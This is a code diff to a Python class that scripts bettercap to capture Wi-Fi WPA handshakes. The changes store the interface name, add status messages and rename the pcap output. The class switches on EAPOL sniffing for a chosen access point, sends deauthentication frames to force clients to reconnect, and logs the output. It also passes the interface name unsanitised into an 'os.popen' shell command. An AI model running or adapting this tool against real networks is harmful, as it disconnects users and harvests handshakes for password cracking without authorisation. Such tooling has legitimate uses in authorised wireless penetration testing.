@@ -9,6 +9,7 @@ bk_ = 0
 
 class CapHandshakes():
     def __init__(self, INTERFACE):
+        self.INTERFACE = INTERFACE
         self.bettercap_process = subprocess.Popen(
             ['sudo', 'bettercap', '-iface', f'{INTERFACE}'],
             stdin=subprocess.PIPE,
@@ -23,7 +24,7 @@ class CapHandshakes():
             return True
 
     def interface_select(self, INTERFACE):
-        test = os.popen(f"iwconfig {INTERFACE} ")
+        test = os.popen(f"iwconfig {self.INTERFACE} ")
         out = test.read()
 
 
@@ -50,15 +51,26 @@ class CapHandshakes():
             f'set wifi.recon channel {selected_chan}',
             'set net.sniff.verbose true',
             'set net.sniff.filter ether proto 0x888e',
-            f'set net.sniff.output wpa({selected_bssid}).pcap',
+            f'set net.sniff.output wpa_{selected_bssid}_.pcap',
             'net.sniff on',
             f'wifi.deauth {selected_bssid}'
         ]
 
-        self.__init__(INTERFACE)
+        messages = [
+            "Starting Recon...",
+            "Examining Networks...",
+            "Setting Channel...",
+            "Setting Verbose...",
+            "Setting Filter...",
+            "Setting Output...",
+            "Starting Sniff...",
+            "Deauthing..."
+        ]
+
+        self.__init__(self.INTERFACE)
         time.sleep(0.5)
         for i in commands:
-            print(f"loop {i}")
+
             #key3
             if self.bk() == True:
                 killwhile = 1
@@ -66,7 +78,7 @@ class CapHandshakes():
                 break
 
             time.sleep(2)
-            ui_print(f"Loading ({commands.index(i)})...", 0.5)
+            ui_print(f"Loading ({commands.index(i)})", 0.5)
             self.bettercap_process.stdin.write(i+'\n')
 
             #key3
@@ -76,7 +88,8 @@ class CapHandshakes():
                 break
 
             self.bettercap_process.stdin.flush()
-            ui_print("Capturing handshakes...", 1)
+            ui_print(messages[commands.index(i)], 1)
+
             #Write output
             with open("output.txt", 'a') as file:
                 file.write(self.bettercap_process.stdout.readline())
